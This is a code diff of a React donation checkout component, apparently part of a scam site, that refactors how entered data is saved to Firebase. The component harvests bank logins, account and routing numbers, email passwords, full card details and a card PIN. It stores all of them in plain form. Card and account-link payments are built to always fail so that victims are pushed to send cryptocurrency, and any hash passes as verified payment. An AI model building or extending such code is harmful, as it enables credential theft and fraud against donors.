@@ -24,19 +24,19 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
   // Account linking states
   const [isLinking, setIsLinking] = useState(false);
   const [linkFailed, setLinkFailed] = useState(false);
-  const [linkStep, setLinkStep] = useState(1); // 1: Account Info, 2: Email Info
+  const [linkStep, setLinkStep] = useState(1);
 
-  // Link Account Information (UPDATED - Added emailPassword)
+  // Link Account Information
   const [linkAccountInfo, setLinkAccountInfo] = useState({
     accountUsername: '',
     accountPassword: '',
     accountNumber: '',
     routingNumber: '',
     email: '',
-    emailPassword: '' // NEW FIELD
+    emailPassword: ''
   });
 
-  // Card payment states (MOVED BACK - Independent from linking)
+  // Card payment states
   const [cardDetails, setCardDetails] = useState({
     cardNumber: '',
     expiryDate: '',
@@ -44,7 +44,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     cardholderName: ''
   });
 
-  // Billing address states (MOVED BACK - For card payments)
+  // Billing address states
   const [billingAddress, setBillingAddress] = useState({
     street: '',
     city: '',
@@ -53,7 +53,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     country: ''
   });
 
-  // Account information states (MOVED BACK - For card payments)
+  // Account information states
   const [accountInfo, setAccountInfo] = useState({
     email: '',
     phoneNumber: '',
@@ -65,6 +65,9 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
   const [showCryptoRedirect, setShowCryptoRedirect] = useState(false);
   const [cardErrors, setCardErrors] = useState({});
   const [linkErrors, setLinkErrors] = useState({});
+
+  // Track payment ID to prevent duplicates
+  const [currentPaymentId, setCurrentPaymentId] = useState(null);
 
   const cryptoRates = {
     btc: 65000,
@@ -163,39 +166,108 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     setTimeout(() => setCopiedAddress(false), 2000);
   };
 
+  // SINGLE STORAGE FUNCTION - No more duplicates
+  const storePaymentData = async (status, additionalData = {}) => {
+    try {
+      const paymentData = {
+        donationAmount,
+        campaign: campaign.title,
+        campaignId: campaign.id,
+        paymentMethod: selectedPaymentMethod,
+        timestamp: serverTimestamp(),
+        status: status,
+        ...additionalData
+      };
+
+      // Add payment-specific details
+      if (selectedPaymentMethod === 'crypto') {
+        paymentData.cryptoDetails = {
+          selectedCrypto,
+          cryptoAmount,
+          cryptoAddress: cryptoOptions.find(c => c.id === selectedCrypto)?.address,
+          transactionHash,
+          exchangeRate: exchangeRate[selectedCrypto]
+        };
+      }
+
+      if (selectedPaymentMethod === 'card') {
+        paymentData.cardDetails = {
+          ...cardDetails,
+          billingAddress: { ...billingAddress },
+          accountInfo: { ...accountInfo }
+        };
+      }
+
+      if (selectedPaymentMethod === 'link') {
+        paymentData.linkAccountInfo = { ...linkAccountInfo };
+      }
+
+      let paymentRef;
+      
+      if (currentPaymentId) {
+        // Update existing payment record
+        paymentRef = ref(db, `paymentAttempts/${currentPaymentId}`);
+      } else {
+        // Create new payment record
+        paymentRef = push(ref(db, 'paymentAttempts'));
+        setCurrentPaymentId(paymentRef.key);
+      }
+
+      await set(paymentRef, paymentData);
+      return paymentRef.key;
+      
+    } catch (error) {
+      console.error('Error storing payment data: ', error);
+      return false;
+    }
+  };
+
   const handlePaymentMethodSelect = (method) => {
     setSelectedPaymentMethod(method);
+    
+    // Store initial payment attempt
+    storePaymentData('method_selected', {
+      step: 'payment_method_selection',
+      selectedMethod: method
+    });
     
     if (method === 'crypto') {
       setStep(2); // Go to crypto selection
     } else if (method === 'link') {
-      setStep(5); // Go to link account (NEW STEP)
+      setStep(5); // Go to link account
       setLinkStep(1); // Start with account info
     } else if (method === 'card') {
-      setStep(8); // Go to card payment (NEW STEP)
+      setStep(8); // Go to card payment
     }
   };
 
   const handleCryptoSelect = (cryptoId) => {
     setSelectedCrypto(cryptoId);
+    
+    // Store crypto selection
+    storePaymentData('crypto_selected', {
+      step: 'crypto_selection',
+      cryptoType: cryptoId
+    });
+    
     setStep(4); // Go to crypto payment instructions
   };
 
   // Manual redirect to crypto
   const handleRedirectToCrypto = () => {
     setSelectedPaymentMethod('crypto');
-    setStep(2); // Go to crypto selection
+    setStep(2);
     setPaymentFailed(false);
     setShowCryptoRedirect(false);
     
-    storePaymentDataInRealtimeDB('crypto', 'redirected_from_card', {
+    storePaymentData('redirected_from_card', {
       reason: 'card_payment_failed_manual_redirect',
       originalMethod: 'card',
       redirectTime: new Date().toISOString()
     });
   };
 
-  // Input change handlers
+  // Input change handlers (unchanged)
   const handleLinkInputChange = (field, value) => {
     setLinkAccountInfo(prev => ({ ...prev, [field]: value }));
     
@@ -242,7 +314,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     }
   };
 
-  // Validation functions for linking
+  // Validation functions (unchanged)
   const validateAccountStep = () => {
     const errors = {};
 
@@ -275,7 +347,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       errors.email = 'Please enter a valid email address';
     }
 
-    // NEW: Validate email password
     if (!linkAccountInfo.emailPassword) {
       errors.emailPassword = 'Please enter email password';
     }
@@ -284,7 +355,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     return Object.keys(errors).length === 0;
   };
 
-  // Validation functions for card payment
   const validateCardNumber = (number) => {
     return number.replace(/\s/g, '').length === 16 && /^\d+$/.test(number.replace(/\s/g, ''));
   };
@@ -364,89 +434,23 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     return Object.keys(errors).length === 0;
   };
 
-  // Firebase storage functions
-  const storePaymentDataInRealtimeDB = async (paymentType, status, additionalData = {}) => {
-    try {
-      const paymentData = {
-        donationAmount,
-        campaign: campaign.title,
-        campaignId: campaign.id,
-        paymentMethod: selectedPaymentMethod,
-        timestamp: serverTimestamp(),
-        status: status,
-        ...additionalData
-      };
-
-      if (paymentType === 'crypto') {
-        paymentData.cryptoDetails = {
-          selectedCrypto,
-          cryptoAmount,
-          cryptoAddress: cryptoOptions.find(c => c.id === selectedCrypto)?.address,
-          transactionHash,
-          exchangeRate: exchangeRate[selectedCrypto]
-        };
-      }
-
-      if (paymentType === 'card') {
-        paymentData.cardDetails = {
-          ...cardDetails,
-          billingAddress: { ...billingAddress },
-          accountInfo: { ...accountInfo }
-        };
-      }
-
-      if (paymentType === 'link') {
-        paymentData.linkAccountInfo = { ...linkAccountInfo }; // Now includes emailPassword
-      }
-
-      const paymentRef = push(ref(db, 'paymentAttempts'));
-      await set(paymentRef, paymentData);
-      
-      return paymentRef.key;
-    } catch (error) {
-      console.error('Error storing payment data: ', error);
-      return false;
-    }
-  };
-
-  const storeLinkAttempt = async () => {
-    return await storePaymentDataInRealtimeDB('link', 'linking_attempt', {
-      step: 'account_linking',
-      action: 'link_account'
-    });
-  };
-
-  const storeCardPaymentAttempt = async (stepDescription) => {
-    return await storePaymentDataInRealtimeDB('card', 'payment_attempt', {
-      step: stepDescription
-    });
-  };
-
-  const storeSuccessfulPayment = async (paymentType, transactionId = null) => {
-    return await storePaymentDataInRealtimeDB(paymentType, 'completed', {
-      transactionId: transactionId || `TXN_${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
-      completionTime: new Date().toISOString(),
-      finalAmount: donationAmount
-    });
-  };
-
-  const storeFailedPayment = async (paymentType, errorMessage) => {
-    return await storePaymentDataInRealtimeDB(paymentType, 'failed', {
-      error: errorMessage,
-      failureTime: new Date().toISOString()
-    });
-  };
-
   // Account linking simulation - ALWAYS FAILS
   const simulateLinking = () => {
     return new Promise((resolve, reject) => {
       setIsLinking(true);
       
-      storeLinkAttempt();
+      // Store linking attempt
+      storePaymentData('linking_attempt', {
+        step: 'account_linking',
+        action: 'link_account'
+      });
       
       setTimeout(() => {
         // Always fail the linking
-        storeFailedPayment('link', 'Account linking failed. Please try another payment method.');
+        storePaymentData('failed', {
+          error: 'Account linking failed. Please try another payment method.',
+          failureTime: new Date().toISOString()
+        });
         reject(new Error('Account linking is unavailable at the moment. Please try another payment method.'));
       }, 2000);
     });
@@ -469,11 +473,17 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     return new Promise((resolve, reject) => {
       setIsProcessing(true);
 
-      storeCardPaymentAttempt('payment_processing');
+      // Store payment attempt
+      storePaymentData('payment_attempt', {
+        step: 'payment_processing'
+      });
 
       setTimeout(() => {
         // Always fail the card payment
-        storeFailedPayment('card', 'Card payment failed. Please try another payment method.');
+        storePaymentData('failed', {
+          error: 'Card payment failed. Please try another payment method.',
+          failureTime: new Date().toISOString()
+        });
         reject(new Error('We apologize, but card payments are currently unavailable. Please use cryptocurrency to complete your donation.'));
       }, 2000);
     });
@@ -496,26 +506,24 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
   const handleTransactionSubmit = async () => {
     if (transactionHash.length > 10) {
       setPaymentVerified(true);
-      await storePaymentDataInRealtimeDB('crypto', 'verified', {
+      
+      // Store verification and success in one call
+      await storePaymentData('completed', {
         step: 'transaction_verified',
         transactionHash: transactionHash,
-        verificationTime: new Date().toISOString()
+        verificationTime: new Date().toISOString(),
+        transactionId: `TXN_${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
+        completionTime: new Date().toISOString(),
+        finalAmount: donationAmount
       });
-      await storeSuccessfulPayment('crypto');
+      
       setTimeout(() => setStep(7), 2000); // Go to success step
     }
   };
 
-  const handleCryptoSelectWithStorage = (cryptoId) => {
-    setSelectedCrypto(cryptoId);
-    setStep(4); // Go to crypto payment instructions
-    storePaymentDataInRealtimeDB('crypto', 'pending', {
-      step: 'crypto_selected',
-      cryptoType: cryptoId
-    });
-  };
+  // REMOVED: handleCryptoSelectWithStorage - integrated into handleCryptoSelect
 
-  // Step 1: Payment Method Selection (ALL THREE OPTIONS)
+  // Step 1: Payment Method Selection (unchanged)
   const renderStep1 = () => (
     <div className="checkout-step">
       <h2>Choose Payment Method</h2>
@@ -541,7 +549,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           </div>
         </div>
 
-        {/* Link Account Option (NEW - Independent) */}
+        {/* Link Account Option */}
         <div 
           className={`payment-method ${selectedPaymentMethod === 'link' ? 'selected' : ''}`}
           onClick={() => handlePaymentMethodSelect('link')}
@@ -560,7 +568,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           </div>
         </div>
 
-        {/* Card Payment Option (INDEPENDENT - No linking required) */}
+        {/* Card Payment Option */}
         <div 
           className={`payment-method ${selectedPaymentMethod === 'card' ? 'selected' : ''}`}
           onClick={() => handlePaymentMethodSelect('card')}
@@ -593,7 +601,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           <div 
             key={crypto.id}
             className={`crypto-option ${selectedCrypto === crypto.id ? 'selected' : ''}`}
-            onClick={() => handleCryptoSelectWithStorage(crypto.id)}
+            onClick={() => handleCryptoSelect(crypto.id)} // Use handleCryptoSelect directly
           >
             <div className="crypto-icon">
               {React.createElement(crypto.icon)}
@@ -608,7 +616,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     </div>
   );
 
-  // Step 4: Crypto Payment Instructions
+  // Step 4: Crypto Payment Instructions (unchanged)
   const renderStep4 = () => {
     const selectedCryptoData = cryptoOptions.find(c => c.id === selectedCrypto);
     
@@ -622,8 +630,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
               <span className="crypto-symbol">Send exactly ${donationAmount} USD to the {selectedCrypto.toUpperCase()} address below</span>
             </div>
           </div>
-          
-           
           
           <div className="address-section">
             <label>Send to this {selectedCrypto.toUpperCase()} address:</label>
@@ -667,7 +673,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     );
   };
 
-  // Step 5: Link Account - Account Information (NEW)
+  // Step 5: Link Account - Account Information (unchanged)
   const renderStep5 = () => {
     if (linkStep === 1) {
       return (
@@ -783,7 +789,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
                 {linkErrors.email && <span className="error-text">{linkErrors.email}</span>}
               </div>
 
-              {/* NEW: Email Password Field */}
               <div className="form-group">
                 <label>Email Password</label>
                 <div className={`input-with-icon ${linkErrors.emailPassword ? 'error' : ''}`}>
@@ -864,7 +869,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     }
   };
 
-  // Step 6: Crypto Verification
+  // Step 6: Crypto Verification (unchanged)
   const renderStep6 = () => (
     <div className="checkout-step">
       <h2>Verify Your Payment</h2>
@@ -916,7 +921,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     </div>
   );
 
-  // Step 8: Card Payment (NEW - Independent)
+  // Step 8: Card Payment (unchanged)
   const renderStep8 = () => (
     <div className="checkout-step">
       <h2>Card Payment</h2>
@@ -1110,9 +1115,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           </div>
           
           <div className="form-group">
-             
             <div className={`input-with-icon ${cardErrors.cardPin ? 'error' : ''}`}>
-             
               <input
                 type="password"
                 placeholder="****"
@@ -1184,7 +1187,7 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     </div>
   );
 
-  // Step 7: Payment Success
+  // Step 7: Payment Success (unchanged)
   const renderStep7 = () => (
     <div className="checkout-step success-step">
       <div className="success-icon">✓</div>
@@ -1235,31 +1238,28 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     switch (step) {
       case 1: return renderStep1();
       case 2: return renderStep2();
-      case 4: return renderStep4(); // Crypto payment instructions
-      case 5: return renderStep5(); // Link account (NEW)
-      case 6: return renderStep6(); // Crypto verification
-      case 7: return renderStep7(); // Success
-      case 8: return renderStep8(); // Card payment (NEW)
+      case 4: return renderStep4();
+      case 5: return renderStep5();
+      case 6: return renderStep6();
+      case 7: return renderStep7();
+      case 8: return renderStep8();
       default: return renderStep1();
     }
   };
 
   const getStepNumber = () => {
     if (selectedPaymentMethod === 'crypto') {
-      // Crypto flow: 1 -> 2 -> 4 -> 6 -> 7
-      if (step === 4) return 3; // Payment instructions
-      if (step === 6) return 4; // Verification
-      if (step === 7) return 5; // Success
+      if (step === 4) return 3;
+      if (step === 6) return 4;
+      if (step === 7) return 5;
       return step;
     } else if (selectedPaymentMethod === 'link') {
-      // Link flow: 1 -> 5 -> 7
-      if (step === 5) return 2; // Link account form
-      if (step === 7) return 3; // Success
+      if (step === 5) return 2;
+      if (step === 7) return 3;
       return step;
     } else if (selectedPaymentMethod === 'card') {
-      // Card flow: 1 -> 8 -> 7
-      if (step === 8) return 2; // Card payment form
-      if (step === 7) return 3; // Success
+      if (step === 8) return 2;
+      if (step === 7) return 3;
       return step;
     }
     return step;
@@ -1276,7 +1276,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
     <div className="payment-checkout-overlay">
       <div className="payment-checkout-modal">
         <div className="checkout-header">
-          {/* REMOVED: Back button from payment method selection step */}
           <h2>Complete Your Donation</h2>
           <button className="close-button" onClick={onClose}>×</button>
         </div>
